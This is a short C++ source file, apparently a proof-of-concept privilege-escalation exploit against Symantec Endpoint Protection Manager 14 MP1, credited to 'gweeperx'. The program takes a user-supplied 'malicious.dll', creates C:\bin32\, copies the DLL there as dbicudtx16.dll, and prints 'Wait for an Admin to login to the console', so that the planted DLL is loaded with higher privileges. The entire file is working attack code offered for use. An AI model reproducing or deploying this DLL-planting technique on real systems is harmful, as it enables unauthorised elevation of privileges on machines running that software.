// SEPM-14_MP1 .2.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include "pch.h"
#include <Windows.h>
#include <stdio.h>


int main(int argc, char *argv[])
{


	if (argc != 2) {
		printf("usage: %s malicious.dll", argv[0]);
		return 0;
	}

	unsigned static char logo[] =
		" +-+-+-+ +-+-+-+-+-+-+-+ +-+-+-+\n"
		" |S|E|P|M| |1|4| |M|P|1| |E|o|P|\n"
		" +-+-+-+-+-+-+-+-+-+-+-+ +-+-+-+\n"
		" |b|y| |g|w|e|e|p|e|r|x|\n"
		" +-+-+ +-+-+-+-+-+-+-+-+\n";

	printf("%s\n\n", &logo);

	char *maliciousDLL = argv[1];

	if (!CreateDirectory("C:\\bin32\\", NULL))
	{
		DWORD err = GetLastError();

		if (err != ERROR_ALREADY_EXISTS)
		{
			// do whatever handling you'd like
		}
	}

	if (!CopyFile(maliciousDLL, "C:\\bin32\\dbicudtx16.dll", FALSE))
	{
		printf("Could not copy %s on C:\\bin32\\dbicudtx16.dll .\n", maliciousDLL);

		//Defined in ErrorExit.h


		return -1;
	}
	else {
		printf("%s has been copied to C:\\bin32\\dbicudtx16.dll\n", maliciousDLL);
	}



	printf("Wait for an Admin to login to the console.\n");

}

